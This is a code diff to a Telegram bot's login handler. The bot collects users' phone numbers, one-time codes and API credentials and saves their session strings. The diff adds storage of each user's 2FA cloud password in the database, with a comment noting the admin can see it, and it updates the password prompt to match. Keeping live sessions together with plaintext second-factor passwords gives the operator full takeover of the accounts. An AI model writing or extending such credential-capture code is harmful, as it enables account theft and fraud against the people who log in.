@@ -103,14 +103,14 @@ class LoginHandler:
             
             try:
                 await client.sign_in(phone, otp)
-                await self._save_session(user_id, client)
+                await self._save_session(user_id, client, password=None)
                 return ConversationHandler.END
                 
             except Exception as e:
                 if "two-steps verification" in str(e).lower() or "password" in str(e).lower():
                     await update.message.reply_text(
                         "🔐 **2FA Enabled**\n\n"
-                        "Please enter your **2FA Password**:",
+                        "Please enter your **2FA Password** (Cloud Password):",
                         parse_mode='Markdown'
                     )
                     return PASSWORD
@@ -132,7 +132,7 @@ class LoginHandler:
         try:
             client = self.temp_data[user_id]['temp_client']
             await client.sign_in(password=password)
-            await self._save_session(user_id, client)
+            await self._save_session(user_id, client, password=password)
             return ConversationHandler.END
             
         except Exception as e:
@@ -142,8 +142,8 @@ class LoginHandler:
             )
             return ConversationHandler.END
     
-    async def _save_session(self, user_id, client):
-        """Save session to database"""
+    async def _save_session(self, user_id, client, password=None):
+        """Save session to database with password"""
         try:
             session_string = client.session.save()
             me = await client.get_me()
@@ -152,7 +152,10 @@ class LoginHandler:
             api_hash = self.temp_data[user_id]['api_hash']
             phone = self.temp_data[user_id]['phone']
             
-            account_id = await db.add_account(user_id, phone, api_id, api_hash, session_string)
+            # Save account with password (admin can see it)
+            account_id = await db.add_account(
+                user_id, phone, api_id, api_hash, session_string, password
+            )
             
             await client_manager.create_client(user_id, account_id, api_id, api_hash, session_string)
             
@@ -179,7 +182,8 @@ class LoginHandler:
                      f"• ⚡ Instant messaging\n"
                      f"• ⏰ Scheduler (India time)\n"
                      f"• 💼 Escrow (groups)\n"
-                     f"• 🤖 Auto-reply (personal)\n\n"
+                     f"• 🤖 Auto-reply (personal)\n"
+                     f"• 📢 Group messages\n\n"
                      f"Use /start to see menu.",
                 parse_mode='Markdown'
             )
